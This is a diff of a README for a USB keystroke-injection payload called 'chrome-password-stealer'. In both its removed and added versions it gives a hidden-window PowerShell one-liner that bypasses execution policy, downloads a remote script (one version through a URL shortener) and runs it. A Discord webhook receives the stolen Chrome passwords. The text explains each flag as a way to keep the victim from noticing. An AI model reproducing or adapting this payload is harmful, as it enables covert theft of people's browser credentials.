@@ -14,29 +14,14 @@ This payload downloads and executes a powershell script that downloads a python 
 (This code is very unoptimized, but i havent bothered fixing it)
 
 ## The rubber ducky script
-When the grabber.dd runs it opens a powershell terminal window and enters this string:
+When the grabber.dd runs it opens a run dialoge and enters this script.
 
 ```powershell
-powershell -w h -NoP -NonI -Exec Bypass -c "cd $env:USERPROFILE\Documents ; iwr -Uri https://raw.githubusercontent.com/simen64/Pico-HID-Scripts/main/chrome-password-stealer/starter.ps1 -OutFile $Env:USERPROFILE\Documents\starter.ps1 ; powershell.exe -File .\starter.ps1 -webhookUrl "<Your discord webhook here>""
+powershell -W h -NonI -NoP -Ep bypass -c "$dc = '<your discord webhook here>'; irm https://shorturl.at/bMQ15 | iex
 ```
-
-### Flags used:
-
-The ```powershell -w h -NoP -NonI -Exec Bypass -c``` tells powershell to execute a set of commands with some flags:
-- ```-w h``` tells powershell to run in a hidden window so the victim cant see logs
-- ```-NoP``` makes sure that none of the users profiles are loaded, which could mess up execution
-- ```-NonI``` Makes the user unable to interact with the script while its running
-- ```-Exec Bypass``` Makes powershell bypass the execution policy which allows powershell to run scripts
-- ```-c``` tells powershell what commands to execute, the commands are enclosed in quotes and seperated with semicolons
-- Now the script proceecds to execute a sequence of commands
-
-### Commands ran:
-
-1. The first command ran is ```cd $env:USERPROFILE\Documents``` which takes us into the users Documents folder where we will be doing everything
-   
-2. Next we run ```iwr -Uri https://raw.githubusercontent.com/simen64/Pico-HID-Scripts/main/chrome-password-stealer/starter.ps1 -OutFile $Env:USERPROFILE\Documents\starter.ps1``` which invokes a web request to the github link where the starter.ps1 script is and downloading it, the script is placed in the Documents folder with the -OutFile argument
-  
-3. Now we run ```powershell.exe -File .\starter.ps1 -webhookUrl "<Your discord webhook here>"``` as our last command. This uses the powershell interpreter to execute the starter.ps1 script and then passes the variable -webhookUrl to the powershell script. This is used for the discord webhook in the script. Dont forget to put your discord webhook there or it wont work.
+This line opens a hidden windows with ``-W h`` a non interactive windows with ``-NonI`` no user profiles with ``NoP`` and bypasses the anti script execution policy using ``-Ep bypass``
+Then it sets the ``$dc`` variable to your webhook.
+And last but not least it downloads the starter.ps1 script and executes it. The download link is shortened to fit inside the run dialoge. (I want to host my own site in the future where i can have my own directly short links)
 
 ## The powershell script
 
